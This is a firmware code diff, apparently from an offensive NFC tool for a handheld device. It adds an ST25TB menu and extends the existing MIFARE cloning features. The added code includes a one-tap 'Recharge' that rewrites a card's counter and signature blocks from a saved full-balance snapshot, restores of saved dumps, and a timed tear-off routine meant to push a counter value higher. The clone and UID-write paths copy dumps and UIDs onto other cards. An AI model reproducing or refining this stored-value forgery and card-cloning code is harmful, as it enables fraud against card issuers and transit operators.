+        if (!have) { msg("No dump in memory.", TFT_ORANGE, "Read+Save first"); wait_key(); return; }
+        std::vector<String> L; char b[40];
+        for (int i = 0; i < dp->nblk; i++) { snprintf(b, sizeof b, "%2d: %02X %02X %02X %02X%s", i, dp->blk[i][0], dp->blk[i][1], dp->blk[i][2], dp->blk[i][3], (i==5||i==6)?" <cnt":((i==15)?" <sig":"")); L.push_back(b); }
+        if (dp->have_sys) { snprintf(b, sizeof b, "FF: %02X %02X %02X %02X <OTP", dp->sys[0], dp->sys[1], dp->sys[2], dp->sys[3]); L.push_back(b); }
+        show_lines(L);
+    };
+    auto do_restore = [&](int from, int to, const char* title) {
+        String path = pick_file(); if (path.length() == 0) return;
+        st25tb::Dump* src = (st25tb::Dump*)malloc(sizeof(st25tb::Dump));
+        if (!src) { msg("Out of memory.", TFT_RED, nullptr); wait_key(); return; }
+        if (!st25tb::st25_load(path.c_str(), *src)) { free(src); msg("Load failed.", TFT_RED, nullptr); wait_key(); return; }
+        msg(title, TFT_YELLOW, "place TARGET card");
+        delay(600);
+        if (!nfc_opened) nfc_open();
+        calypso::caly_isob_begin();
+        int nok = 0, nf = 0; bool ran = st25tb::st25_restore(*src, from, to, &nok, &nf);
+        calypso::caly_isob_end(); free(src);
+        std::vector<String> L; char b[40];
+        if (!ran) { L.push_back("No target card."); }
+        else { snprintf(b, sizeof b, "blocks %d..%d", from, to); L.push_back(b);
+            snprintf(b, sizeof b, "%d written OK", nok); L.push_back(b);
+            snprintf(b, sizeof b, "%d failed (RO/countdown)", nf); L.push_back(b);
+            L.push_back(nf == 0 ? "RECHARGE OK" : "partial (see fails)"); }
+        show_lines(L);
+    };
+    auto act_write_test = [&]() {
+        msg("Write test: blk7...", TFT_YELLOW, "place tag");
+        if (!nfc_opened) nfc_open();
+        calypso::caly_isob_begin();
+        uint8_t chip; std::vector<String> L;
+        if (st25tb::st25_select(&chip) > 0) {
+            uint8_t bak[4]; st25tb::st25_read_block(7, bak);
+            uint8_t test[4] = { 0xAA, 0xBB, 0xCC, 0xDD };
+            bool w = st25tb::st25_write_block(7, test);
+            bool rb = st25tb::st25_write_block(7, bak);   // restore original
+            st25tb::st25_completion();
+            char b[40];
+            snprintf(b, sizeof b, "blk7 was %02X%02X%02X%02X", bak[0], bak[1], bak[2], bak[3]); L.push_back(b);
+            L.push_back(w ? "write AABBCCDD: OK" : "write: FAIL");
+            L.push_back(rb ? "restored original: OK" : "restore: FAIL");
+            L.push_back(w ? "=> card is REWRITABLE" : "=> blk7 not writable");
+        } else L.push_back("No ST25TB tag.");
+        calypso::caly_isob_end();
+        show_lines(L);
+    };
+
+    // one-tap recharge: read the card, find its saved snapshot by UID, rewrite
+    // the counter blocks (5/6) + signature (15) from that full-balance snapshot.
+    auto act_recharge = [&]() {
+        msg("Recharge: reading card...", TFT_YELLOW, "place YOUR card");
+        if (!nfc_opened) nfc_open();
+        st25tb::Dump* dd = (st25tb::Dump*)malloc(sizeof(st25tb::Dump));   // heap (not stack)
+        if (!dd) { msg("Out of memory.", TFT_RED, nullptr); wait_key(); return; }
+        calypso::caly_isob_begin();
+        bool okr = st25tb::st25_dump(*dd);
+        calypso::caly_isob_end();
+        if (!okr) { free(dd); msg("No ST25TB card.", TFT_RED, nullptr); wait_key(); return; }
+        char path[80]; st25tb::st25_path(*dd, path, sizeof path);
+        if (!st25tb::st25_load(path, *dd)) {    // reuse the same buffer for the snapshot
+            free(dd);
+            std::vector<String> L; L.push_back("No saved snapshot for this");
+            L.push_back("card. Do Read+Save at FULL");
+            L.push_back("balance first, then Recharge.");
+            char b[48]; snprintf(b, sizeof b, "want: %s", path); L.push_back(b);
+            show_lines(L); return;
+        }
+        calypso::caly_isob_begin();
+        uint8_t chip; std::vector<String> L;
+        if (st25tb::st25_select(&chip) > 0) {
+            const int rb[3] = { 5, 6, 15 }; int nok = 0, nf = 0;
+            for (int k = 0; k < 3; k++) { int b = rb[k]; if (b >= dd->nblk) continue;
+                bool w = st25tb::st25_write_block((uint8_t)b, dd->blk[b]);
+                char line[40]; snprintf(line, sizeof line, "blk%d <- %02X%02X%02X%02X %s", b, dd->blk[b][0], dd->blk[b][1], dd->blk[b][2], dd->blk[b][3], w ? "OK" : "FAIL");
+                L.push_back(line); if (w) nok++; else nf++; }
+            st25tb::st25_completion();
+            L.insert(L.begin(), nf == 0 ? String("RECHARGED (5/6/15 OK)") : String("partial (see FAIL = countdown?)"));
+        } else L.push_back("card lost");
+        calypso::caly_isob_end(); free(dd);
+        show_lines(L);
+    };
+
+    auto act_tear = [&]() {
+        msg("Tear-off blk5...", TFT_YELLOW, "hold card still ~1s");
+        if (!nfc_opened) nfc_open();
+        calypso::caly_isob_begin();
+        uint8_t chip, orig[4]; std::vector<String> L; bool hit = false;
+        if (st25tb::st25_select(&chip) > 0) {
+            st25tb::st25_read_block(5, orig); st25tb::st25_completion();
+            uint32_t oLE = st25tb::st25_u32le(orig), oBE = st25tb::st25_u32be(orig);
+            char b[40]; snprintf(b, sizeof b, "orig %02X%02X%02X%02X", orig[0], orig[1], orig[2], orig[3]); L.push_back(b);
+            for (uint32_t du = 100; du <= 3000 && !hit; du += 100) {
+                uint8_t out[4]; if (!st25tb::st25_tear_once(5, orig, du, out)) continue;
+                uint32_t LE = st25tb::st25_u32le(out), BE = st25tb::st25_u32be(out);
+                bool changed = memcmp(out, orig, 4) != 0, higher = (LE > oLE) || (BE > oBE);
+                if (changed) { snprintf(b, sizeof b, "%luus %02X%02X%02X%02X%s", (unsigned long)du, out[0], out[1], out[2], out[3], higher ? " HIGH!" : ""); L.push_back(b); }
+                if (higher) hit = true; else if (changed) { memcpy(orig, out, 4); oLE = LE; oBE = BE; }
+            }
+            L.insert(L.begin(), hit ? String("TEAR HIT (higher!)") : String("no increase (serial = finer)"));
+        } else L.push_back("no card");
+        calypso::caly_isob_end();
+        show_lines(L);
+    };
+
+    const int lineH = 17, listY = 19, N = 8;
+    const int maxVis = (H - listY - 14) / lineH;
+    int sel = 0, start = 0; bool draw = true;
+    while (true) {
+        if (draw) {
+            const char* items[N] = { "Read + Save (SD)", "View dump", "Recharge card (auto)", "Restore ALL (from SD)", "Restore counters 5-6", "Write test (blk7)", "Tear-off blk5 (exp)", "Info / emulation" };
+            if (sel < start) start = sel; if (sel >= start + maxVis) start = sel - maxVis + 1;
+            sp.fillScreen(TFT_BLACK); header("ST25TB");
+            for (int i = 0; i < maxVis && (start + i) < N; i++) { int idx = start + i, y = listY + i * lineH;
+                if (idx == sel) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); } else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                sp.setCursor(10, y + 2); sp.print(items[idx]); }
+            footer(";/. ENT  BACK=exit"); draw = false;
+        }
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        if (kp(';')) { sel = (sel - 1 + N) % N; draw = true; keyRelease(); delay(130); }
+        if (kp('.')) { sel = (sel + 1) % N; draw = true; keyRelease(); delay(130); }
+        if (kp(KEY_ENTER)) { keyRelease();
+            if (sel == 0) act_read();
+            else if (sel == 1) act_view();
+            else if (sel == 2) act_recharge();
+            else if (sel == 3) do_restore(0, 127, "Restore ALL blocks");
+            else if (sel == 4) do_restore(5, 6, "Restore counters 5-6");
+            else if (sel == 5) act_write_test();
+            else if (sel == 6) act_tear();
+            else { std::vector<String> L; L.push_back("ST25TB = Type B' memory.");
+                   L.push_back("Read/write OK via HAT.");
+                   L.push_back("Emulation NOT possible:");
+                   L.push_back("ST25R3916 listens NFC-A/F");
+                   L.push_back("only, not Type B. Recharge");
+                   L.push_back("= write real card (restore)."); show_lines(L); }
+            draw = true;
+        }
+        delay(10);
+    }
+    calypso::caly_isob_end();
+    free(dp);
+    if (nfc_opened) { nfc_close(); nfc_open(); }   // belt-and-suspenders per handoff
+}
+
 void nfcMenu() {
     keyRelease();
     const int W = 240, H = 135;
@@ -50258,8 +52157,8 @@ void nfcMenu() {
     if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(W, H); }
     auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
 
-    const char* items[] = {"Read Tag", "Saved Tags", "EMV Reader", "Write NDEF", "Write Clone", "Write UID", "Relay/Emul", "Ultralight/NTAG", "ISO-V/F/B Scan", "DESFire", "mfkey (MIFARE)", "Amiibo"};
-    const int nfc_item_count = 12;
+    const char* items[] = {"Read Tag", "Saved Tags", "EMV Reader", "Write NDEF", "Write Clone", "Write UID", "Relay/Emul", "Ultralight/NTAG", "ISO-V/F/B Scan", "DESFire", "mfkey (MIFARE)", "Amiibo", "Calypso (ISO-B)", "ST25TB"};
+    const int nfc_item_count = 14;
     const int nfc_lineH = 16;
     const int nfc_listY = 18;
     const int nfc_maxVis = (H - nfc_listY - 14) / nfc_lineH;
@@ -51042,121 +52941,100 @@ void nfcMenu() {
 
         // ── Mode 4: Write NDEF ──
         if (mode == 4) {
-            // Sub-menu: URL or Text
-            sp.fillScreen(TFT_BLACK);
-            sp.fillRect(0, 0, W, 14, 0x0841);
-            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF");
-            sp.setTextColor(TFT_CYAN, TFT_BLACK);
-            sp.setCursor(10, 24); sp.print("1. URL");
-            sp.setCursor(10, 40); sp.print("2. Text");
-            sp.fillRect(0, H-14, W, 14, 0x0841);
-            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("1-2=select BACK=menu");
-            if (use_sprite) sprite->pushSprite(0, 0);
-
-            int ndef_type = 0;
-            while (!ndef_type) {
-                M5.update(); cardUpdate();
-                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
-                if (kp('1')) ndef_type = 1;
-                if (kp('2')) ndef_type = 2;
-                delay(10);
-            }
-            keyRelease();
-
-            // Text input via keyboard
-            char input_buf[128] = {};
-            int input_pos = 0;
-            const char* prompt = (ndef_type == 1) ? "Enter URL:" : "Enter text:";
-            if (ndef_type == 1) { strcpy(input_buf, "https://"); input_pos = 8; }
-
-            while (true) {
+            // Record-type picker (scrollable)
+            const char* nd_items[] = {"URL", "Text", "WiFi", "Tel", "Email", "SMS", "Contact (vCard)", "Android app"};
+            const int ND_N = 8;
+            int nsel = 0; bool pick_done = false, cancelled = false;
+            enterDebounce();
+            while (!pick_done && !cancelled) {
                 sp.fillScreen(TFT_BLACK);
                 sp.fillRect(0, 0, W, 14, 0x0841);
-                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print(prompt);
-                sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                // Show text with word wrap
-                sp.setCursor(4, 20);
-                for (int ci = 0; ci < input_pos; ci++) {
-                    sp.print(input_buf[ci]);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF - type");
+                for (int i = 0; i < ND_N; i++) {
+                    int y = 18 + i * 14;
+                    sp.setTextColor(i == nsel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                    sp.setCursor(6, y); sp.print(i == nsel ? "> " : "  "); sp.print(nd_items[i]);
                 }
-                sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.print("_");
                 sp.fillRect(0, H-14, W, 14, 0x0841);
-                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                sp.printf("ENTER=write  len:%d", input_pos);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print(";/.=move ENTER=ok BACK=menu");
                 if (use_sprite) sprite->pushSprite(0, 0);
-
-                M5.update(); cardUpdate();
-                if (kp(KEY_ENTER) && input_pos > 0) { keyRelease(); break; }
-                if (kp(KEY_BACKSPACE) && input_pos > 0) { input_buf[--input_pos] = 0; keyRelease(); continue; }
-                if (kp(KEY_BACKSPACE) && input_pos == 0) { keyRelease(); break; }
-                // Scan printable ASCII keys
-                for (char c = ' '; c <= '~'; c++) {
-                    if (kp(c) && input_pos < 126) {
-                        input_buf[input_pos++] = c;
-                        input_buf[input_pos] = 0;
-                        keyRelease();
-                        break;
-                    }
+                while (true) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
+                    if (kp(KEY_ENTER)) { keyRelease(); pick_done = true; break; }
+                    if (kp(';')) { keyRelease(); nsel = (nsel + ND_N - 1) % ND_N; break; }
+                    if (kp('.')) { keyRelease(); nsel = (nsel + 1) % ND_N; break; }
+                    delay(10);
                 }
-                delay(20);
+            }
+            if (cancelled) break;
+
+            // Collect field(s) and encode
+            uint8_t ndef_rec[256]; int rec_len = 0;
+            char f1[128], f2[128];
+            if (nsel == 0) {                                   // URL
+                if (!ndef_kbd_input("Enter URL", f1, sizeof f1, false, sp, use_sprite, sprite, "https://")) break;
+                rec_len = nfc_ndef_encode_url(f1, ndef_rec, sizeof ndef_rec);
+            } else if (nsel == 1) {                            // Text
+                if (!ndef_kbd_input("Enter text", f1, sizeof f1, false, sp, use_sprite, sprite, NULL)) break;
+                rec_len = nfc_ndef_encode_text(f1, ndef_rec, sizeof ndef_rec);
+            } else if (nsel == 2) {                            // WiFi
+                if (!ndef_kbd_input("WiFi SSID", f1, sizeof f1, false, sp, use_sprite, sprite, NULL)) break;
+                if (!ndef_kbd_input("WiFi pass (empty=open)", f2, sizeof f2, true, sp, use_sprite, sprite, NULL)) f2[0] = 0;
+                rec_len = nfc_ndef_encode_wifi(f1, f2, ndef_rec, sizeof ndef_rec);
+            } else if (nsel == 3) {                            // Tel
+                char tmp[136]; if (!ndef_kbd_input("Phone number", f1, sizeof f1, false, sp, use_sprite, sprite, NULL)) break;
+                snprintf(tmp, sizeof tmp, "tel:%s", f1); rec_len = nfc_ndef_encode_url(tmp, ndef_rec, sizeof ndef_rec);
+            } else if (nsel == 4) {                            // Email
+                char tmp[140]; if (!ndef_kbd_input("Email address", f1, sizeof f1, false, sp, use_sprite, sprite, NULL)) break;
+                snprintf(tmp, sizeof tmp, "mailto:%s", f1); rec_len = nfc_ndef_encode_url(tmp, ndef_rec, sizeof ndef_rec);
+            } else if (nsel == 5) {                            // SMS
+                char tmp[136]; if (!ndef_kbd_input("SMS number", f1, sizeof f1, false, sp, use_sprite, sprite, NULL)) break;
+                snprintf(tmp, sizeof tmp, "sms:%s", f1); rec_len = nfc_ndef_encode_url(tmp, ndef_rec, sizeof ndef_rec);
+            } else if (nsel == 6) {                            // Contact (vCard)
+                if (!ndef_kbd_input("Contact name", f1, sizeof f1, false, sp, use_sprite, sprite, NULL)) break;
+                if (!ndef_kbd_input("Contact phone", f2, sizeof f2, false, sp, use_sprite, sprite, NULL)) f2[0] = 0;
+                rec_len = nfc_ndef_encode_vcard(f1, f2, ndef_rec, sizeof ndef_rec);
+            } else {                                           // Android app (AAR)
+                if (!ndef_kbd_input("App package", f1, sizeof f1, false, sp, use_sprite, sprite, "com.")) break;
+                rec_len = nfc_ndef_encode_aar(f1, ndef_rec, sizeof ndef_rec);
             }
 
-            // Encode NDEF
-            uint8_t ndef_rec[200];
-            int rec_len = 0;
-            if (ndef_type == 1) rec_len = nfc_ndef_encode_url(input_buf, ndef_rec, sizeof(ndef_rec));
-            else rec_len = nfc_ndef_encode_text(input_buf, ndef_rec, sizeof(ndef_rec));
-
-            if (rec_len == 0) {
-                sp.fillScreen(TFT_BLACK);
-                sp.setTextColor(TFT_RED, TFT_BLACK);
-                sp.setCursor(10, 50); sp.print("Encode failed");
-                if (use_sprite) sprite->pushSprite(0, 0);
-                delay(2000); break;
+            if (rec_len <= 0) {
+                sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK);
+                sp.setCursor(10, 50); sp.print("Encode failed (too big?)");
+                if (use_sprite) sprite->pushSprite(0, 0); delay(2000); break;
             }
+            uint8_t tlv_buf[280];
+            int tlv_len = nfc_ndef_wrap_tlv(ndef_rec, rec_len, tlv_buf, sizeof tlv_buf);
 
-            uint8_t tlv_buf[220];
-            int tlv_len = nfc_ndef_wrap_tlv(ndef_rec, rec_len, tlv_buf, sizeof(tlv_buf));
-
-            // Place tag screen
-            sp.fillScreen(TFT_BLACK);
-            sp.fillRect(0, 0, W, 14, 0x0841);
+            // Wait for an NTAG/Ultralight, detect capacity, write + verify
+            sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
             sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF");
-            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-            sp.setCursor(20, 50); sp.print("Place NTAG/Ultralight...");
+            sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(16, 50); sp.print("Place NTAG/Ultralight...");
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=cancel");
             if (use_sprite) sprite->pushSprite(0, 0);
-
             while (true) {
                 M5.update(); cardUpdate();
                 if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
-
                 NfcCardInfo card = nfc_activate();
                 if (card.valid && (card.sak == 0x00 || card.sak == 0x04)) {
-                    sp.fillScreen(TFT_BLACK);
+                    int last_page = 15; int cap = nfc_ntag_capacity(&last_page);
+                    sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write NDEF");
                     sp.setTextColor(TFT_CYAN, TFT_BLACK);
-                    sp.setCursor(10, 30); sp.print("Writing...");
-                    sp.setCursor(10, 45); sp.printf("%d bytes → %d pages", tlv_len, (tlv_len+3)/4);
+                    sp.setCursor(10, 24); sp.printf("Tag cap: %d B", cap);
+                    sp.setCursor(10, 40); sp.printf("NDEF: %d B (%d pages)", tlv_len, (tlv_len + 3) / 4);
                     if (use_sprite) sprite->pushSprite(0, 0);
-
-                    bool ok = nfc_write_ndef(tlv_buf, tlv_len);
+                    bool ok = (tlv_len <= cap) && nfc_write_ndef_verified(tlv_buf, tlv_len, last_page, sp, use_sprite, sprite);
                     sp.fillScreen(TFT_BLACK);
-                    if (ok) {
-                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                        sp.setCursor(10, 50); sp.print("NDEF written!");
-                    } else {
-                        sp.setTextColor(TFT_RED, TFT_BLACK);
-                        sp.setCursor(10, 50); sp.print("Write failed!");
-                    }
-                    sp.setTextColor(0x5AEB, TFT_BLACK);
-                    sp.setCursor(10, 75); sp.print("BACK=menu");
+                    if (ok) { sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(10, 50); sp.print("NDEF written + verified!"); }
+                    else if (tlv_len > cap) { sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, 45); sp.print("Too big for this tag!"); sp.setCursor(10, 62); sp.printf("%d > %d bytes", tlv_len, cap); }
+                    else { sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, 50); sp.print("Write/verify failed!"); }
+                    sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(10, 80); sp.print("BACK=menu");
                     if (use_sprite) sprite->pushSprite(0, 0);
-                    while (true) {
-                        M5.update(); cardUpdate();
-                        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
-                        delay(10);
-                    }
+                    while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(10); }
                     break;
                 }
                 delay(200);
@@ -51173,7 +53051,7 @@ void nfcMenu() {
                 while (File entry = dir.openNextFile()) {
                     if (!entry.isDirectory() && file_count < 20) {
                         String fn = String(entry.name());
-                        if (fn.endsWith(".nfc") || fn.endsWith(".txt"))
+                        if (fn.endsWith(".nfc") || fn.endsWith(".txt") || fn.endsWith(".bin") || fn.endsWith(".dump") || fn.endsWith(".mfd") || fn.endsWith(".eml") || fn.endsWith(".mct"))
                             files[file_count++] = String("/evil/nfc/") + entry.name();
                     }
                     entry.close();
@@ -51187,17 +53065,19 @@ void nfcMenu() {
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000);
             } else {
-                int sel = 0;
+                int sel = 0, scroll = 0;
                 bool selecting = true;
                 while (selecting) {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write Clone");
-                    for (int i = 0; i < min(file_count, 7); i++) {
-                        sp.setTextColor(i == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.printf("Write Clone (%d)", file_count);
+                    int vis = min(file_count - scroll, 7);
+                    for (int i = 0; i < vis; i++) {
+                        int idx = scroll + i;
+                        sp.setTextColor(idx == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
                         sp.setCursor(4, 18 + i * 14);
-                        String fn = files[i].substring(files[i].lastIndexOf('/') + 1);
-                        sp.print(i == sel ? "> " : "  "); sp.print(fn);
+                        String fn = files[idx].substring(files[idx].lastIndexOf('/') + 1);
+                        sp.print(idx == sel ? "> " : "  "); sp.print(fn);
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
@@ -51207,14 +53087,14 @@ void nfcMenu() {
                     while (true) {
                         M5.update(); cardUpdate();
                         if (kp(KEY_BACKSPACE)) { keyRelease(); selecting = false; break; }
-                        if (kp('.') || kp(',')) { keyRelease(); sel = (sel + 1) % file_count; break; }
-                        if (kp(KEY_TAB) || kp(';')) { keyRelease(); sel = (sel - 1 + file_count) % file_count; break; }
+                        if (kp('.') || kp(',')) { keyRelease(); sel = (sel + 1) % file_count; if (sel < scroll) scroll = sel; if (sel >= scroll + 7) scroll = sel - 6; break; }
+                        if (kp(KEY_TAB) || kp(';')) { keyRelease(); sel = (sel - 1 + file_count) % file_count; if (sel < scroll) scroll = sel; if (sel >= scroll + 7) scroll = sel - 6; break; }
                         if (kp(KEY_ENTER)) {
                             keyRelease();
                             // Parse dump file
                             uint8_t dump_blocks[64][16];
                             uint8_t dump_uid[10]; int dump_uid_len = 0;
-                            int n_blocks = nfc_parse_dump(files[sel].c_str(), dump_blocks, 64, dump_uid, &dump_uid_len);
+                            int n_blocks = nfc_load_any_dump(files[sel].c_str(), dump_blocks, 64, dump_uid, &dump_uid_len);
                             if (n_blocks == 0) {
                                 sp.fillScreen(TFT_BLACK);
                                 sp.setTextColor(TFT_RED, TFT_BLACK);
@@ -51250,6 +53130,17 @@ void nfcMenu() {
                                 delay(2000); break;
                             }
 
+                            // Block 0 safety: if the dump has no real block 0, rebuild
+                            // it from the UID: line so we don't zero the target's UID.
+                            if (!nfc_blk0_has_uid(dump_blocks[0])) {
+                                if (dump_uid_len >= 4) {
+                                    nfc_build_block0(dump_uid, dump_uid_len, dump_blocks[0]);
+                                    Serial.println("[MF] block0 absent in dump -> rebuilt from UID");
+                                } else {
+                                    Serial.println("[MF] block0 absent and no UID -> will skip block0");
+                                }
+                            }
+
                             // Write blocks
                             const uint8_t default_key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                             int written = 0, failed = 0;
@@ -51269,6 +53160,7 @@ void nfcMenu() {
                             int consecutive_no_card = 0;
                             for (int blk = 0; blk < n_blocks; blk++) {
                                 if (blk % 4 == 3) continue; // skip sector trailers
+                                if (blk == 0 && !nfc_blk0_has_uid(dump_blocks[0])) { Serial.println("[MF] skip block0 (no UID in dump)"); continue; }
                                 // Block 0 (UID) — try writing it (works on magic cards via encrypted write)
 
                                 bool blk_ok = false;
@@ -51383,7 +53275,7 @@ void nfcMenu() {
                 while (File entry = dir.openNextFile()) {
                     if (!entry.isDirectory() && file_count < 20) {
                         String fn = String(entry.name());
-                        if (fn.endsWith(".txt"))
+                        if (fn.endsWith(".txt") || fn.endsWith(".nfc") || fn.endsWith(".bin") || fn.endsWith(".dump") || fn.endsWith(".mfd") || fn.endsWith(".eml") || fn.endsWith(".mct"))
                             files[file_count++] = String("/evil/nfc/") + entry.name();
                     }
                     entry.close();
@@ -51397,17 +53289,19 @@ void nfcMenu() {
                 if (use_sprite) sprite->pushSprite(0, 0);
                 delay(2000);
             } else {
-                int sel = 0;
+                int sel = 0, scroll = 0;
                 bool picking = true;
                 while (picking) {
                     sp.fillScreen(TFT_BLACK);
                     sp.fillRect(0, 0, W, 14, 0x0841);
-                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Write UID");
-                    for (int i = 0; i < min(file_count, 7); i++) {
-                        sp.setTextColor(i == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.printf("Write UID (%d)", file_count);
+                    int vis = min(file_count - scroll, 7);
+                    for (int i = 0; i < vis; i++) {
+                        int idx = scroll + i;
+                        sp.setTextColor(idx == sel ? TFT_GREEN : TFT_DARKGREEN, TFT_BLACK);
                         sp.setCursor(4, 18 + i * 14);
-                        String fn = files[i].substring(files[i].lastIndexOf('/') + 1);
-                        sp.print(i == sel ? "> " : "  "); sp.print(fn);
+                        String fn = files[idx].substring(files[idx].lastIndexOf('/') + 1);
+                        sp.print(idx == sel ? "> " : "  "); sp.print(fn);
                     }
                     sp.fillRect(0, H-14, W, 14, 0x0841);
                     sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
@@ -51417,26 +53311,38 @@ void nfcMenu() {
                     while (true) {
                         M5.update(); cardUpdate();
                         if (kp(KEY_BACKSPACE)) { keyRelease(); picking = false; break; }
-                        if (kp('.')) { keyRelease(); sel = (sel + 1) % file_count; break; }
-                        if (kp(';')) { keyRelease(); sel = (sel - 1 + file_count) % file_count; break; }
+                        if (kp('.')) { keyRelease(); sel = (sel + 1) % file_count; if (sel < scroll) scroll = sel; if (sel >= scroll + 7) scroll = sel - 6; break; }
+                        if (kp(';')) { keyRelease(); sel = (sel - 1 + file_count) % file_count; if (sel < scroll) scroll = sel; if (sel >= scroll + 7) scroll = sel - 6; break; }
                         if (kp(KEY_ENTER)) {
                             keyRelease();
                             // Parse UID + block 0 from file
                             uint8_t blk0[16] = {};
                             uint8_t uid[10]; int uid_len = 0;
                             uint8_t dump_blocks[4][16];
-                            int n_blks = nfc_parse_dump(files[sel].c_str(), dump_blocks, 4, uid, &uid_len);
+                            int n_blks = nfc_load_any_dump(files[sel].c_str(), dump_blocks, 4, uid, &uid_len);
 
-                            // Build block 0: UID + BCC + SAK + ATQA
-                            if (uid_len >= 4) {
-                                memcpy(blk0, uid, uid_len);
-                                if (uid_len == 4) {
-                                    blk0[4] = uid[0] ^ uid[1] ^ uid[2] ^ uid[3]; // BCC
-                                    blk0[5] = 0x08; // SAK for Classic 1K
-                                    blk0[6] = 0x04; blk0[7] = 0x00; // ATQA
-                                }
-                                // If block 0 was in the dump, use it directly
-                                if (n_blks > 0) memcpy(blk0, dump_blocks[0], 16);
+                            // Build block 0. Prefer a REAL captured block 0 (keeps
+                            // manufacturer bytes); otherwise rebuild from the UID.
+                            // Never copy an all-zero parsed block 0 over a good UID
+                            // (that was the bug that wrote UID 00000000).
+                            if (n_blks > 0 && nfc_blk0_has_uid(dump_blocks[0])) {
+                                memcpy(blk0, dump_blocks[0], 16);
+                                if (uid_len < 4) { memcpy(uid, blk0, 4); uid_len = 4; }  // for display
+                            } else if (uid_len >= 4) {
+                                nfc_build_block0(uid, uid_len, blk0);
+                            }
+
+                            // No usable UID anywhere -> abort instead of writing zeros.
+                            if (!nfc_blk0_has_uid(blk0)) {
+                                sp.fillScreen(TFT_BLACK);
+                                sp.setTextColor(TFT_RED, TFT_BLACK);
+                                sp.setCursor(10, 45); sp.print("No UID in source dump");
+                                sp.setCursor(10, 60); sp.print("(need a Block 0 or UID:)");
+                                sp.fillRect(0, H-14, W, 14, 0x0841);
+                                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                                while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(10); }
+                                break;
                             }
 
                             sp.fillScreen(TFT_BLACK);
@@ -52527,6 +54433,15 @@ void nfcMenu() {
         // ── Mode 12: Amiibo (NTAG215) emulate / clone ──
         if (mode == 12) {
             nfc_amiibo_ui();
+        }
+
+        // ── Mode 13: Calypso / Intercode transport card (ISO-B, read-only) ──
+        if (mode == 13) {
+            nfc_calypso_ui();
+        }
+
+        if (mode == 14) {
+            st25tbMenu();
         }
 
     } // end while(true) NFC sub-menu loop
